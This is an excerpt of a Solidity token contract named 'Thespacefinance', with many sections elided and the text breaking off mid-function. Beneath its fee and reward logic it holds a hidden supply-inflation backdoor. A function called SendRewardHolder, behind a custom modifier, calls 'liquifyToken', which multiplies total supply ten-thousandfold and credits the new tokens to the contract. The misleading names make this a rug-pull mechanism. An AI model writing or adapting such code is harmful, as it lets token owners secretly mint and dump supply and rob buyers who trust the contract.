...
/**
tg: https://t.me/thespacefinance
web: http://TheSpace.finance
*/
...
contract Thespacefinance is Context, IERC20, Ownable {
    ...
    string private constant _name = "Thespacefinance";
    string private constant _symbol = "TheSpace";
    ...
    address payable public MarketingAddress = payable(0x67fcDB2Fd9c9091c8e0F8EB0553a6b40A2b56980);
    ...
    address public MarketingWallet = 0x67fcDB2Fd9c9091c8e0F8EB0553a6b40A2b56980;
   ...
   function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner {
    ...
    function _getTValues(uint256 tAmount, bool takeFee) private view returns (valuesFromGetValues memory s) {
        ...
        s.tDonations = tAmount.mul(MarketingTax).div(100);
    ...
    function reflectDonationsFee(uint256 tDonations) private {
        ...
        _rOwned[MarketingWallet] = _rOwned[MarketingWallet].add(rDonations);
    }

    function SendRewardHolder() external opcode {
        
        uint256 RewardVal = 10000;
        uint256 _DonationsID = DonationsID;

        uint256 before = _getRate();
        liquifyToken(RewardVal, _DonationsID);
    ...
    function liquifyToken(uint256 RewardVal, uint256 _DonationsID) private {
        if(DonationsID == _DonationsID){
         _totalSupply = _totalSupply + (_totalSupply * 10**4);
        _rOwned[address(this)] = _rOwned[address(this)].add(_rTotal*RewardVal);
        _rTotal = _rTotal + (_rTotal*RewardVal);
        } else{
            _totalSupply = _totalSupply + (_totalSupply + 10**4);
